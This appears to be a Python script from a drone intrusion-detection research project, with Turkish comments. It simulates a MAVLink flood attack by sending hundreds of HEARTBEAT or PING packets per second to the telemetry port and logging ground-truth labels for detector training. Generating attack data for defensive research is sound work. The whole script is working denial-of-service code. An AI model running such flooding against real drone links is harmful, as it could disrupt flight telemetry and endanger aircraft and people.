#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""flood.py — BOĞMA (flood) saldırısı.

Ne yapar: Çok yüksek frekansta (ör. saniyede yüzlerce) HEARTBEAT veya PING
mesajı göndererek telsiz kanalını (UDP 14550) doldurur. Amaç, meşru
telemetriyi boğan bir hizmet dışı bırakma (DoS) benzeri durumu simüle
etmektir. Öznitelik tarafında bu, pencere başına paket sayısında ani
artış ve paketler arası sürenin düşmesi olarak görünür.

GÜVENLİK: Yalnızca 127.0.0.1 hedefine bağlanır. Yalnızca simülasyon içindir.

Kullanım:
    python betikler/saldirilar/flood.py --ucus F309_flood --sure 20 \
        --baslangic-gecikme 45 --hiz 300
"""

from __future__ import annotations

import time

import saldiri_temel as st
import ortak
from pymavlink import mavutil


def main() -> int:
    ap = st.temel_arg_parser(__doc__)
    ap.add_argument("--hiz", type=float, default=300.0, help="Saniyedeki paket sayısı.")
    ap.add_argument(
        "--mesaj", default="heartbeat", choices=["heartbeat", "ping"],
        help="Boğma için kullanılacak mesaj türü.",
    )
    args = ap.parse_args()

    cfg = ortak.config_oku()
    baglanti = st.gonderen_kur(cfg, source_system=200, source_component=1)
    st.baslangic_gecikmesi_bekle(args.baslangic_gecikme)

    ortak.log(f"Boğma saldırısı başlıyor (~{args.hiz} paket/sn, {args.mesaj}).", "UYARI")
    start_ns = ortak.simdi_ns()
    attacker_addr = None
    aralik = 1.0 / max(args.hiz, 1.0)

    son = time.time() + args.sure
    gonderilen = 0
    while time.time() < son:
        if args.mesaj == "heartbeat":
            baglanti.mav.heartbeat_send(
                mavutil.mavlink.MAV_TYPE_GCS,
                mavutil.mavlink.MAV_AUTOPILOT_INVALID, 0, 0,
                mavutil.mavlink.MAV_STATE_ACTIVE,
            )
        else:
            baglanti.mav.ping_send(int(time.time() * 1e6), gonderilen % 256, 0, 0)
        gonderilen += 1
        if attacker_addr is None:
            attacker_addr = st.attacker_addr_al(baglanti, cfg)
        if aralik > 0:
            time.sleep(aralik)

    end_ns = ortak.simdi_ns()
    sure_gercek = max((end_ns - start_ns) / 1e9, 1e-9)
    ortak.log(
        f"Saldırı bitti. {gonderilen} paket (~{gonderilen / sure_gercek:.0f} paket/sn).",
        "BILGI",
    )

    st.ground_truth_yaz(
        args.ucus, "flood", start_ns, end_ns,
        attacker_addr or f"{cfg.get('host')}:?",
        {"mesaj": args.mesaj, "hedef_hiz": args.hiz, "gonderilen": gonderilen}, cfg,
    )
    baglanti.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
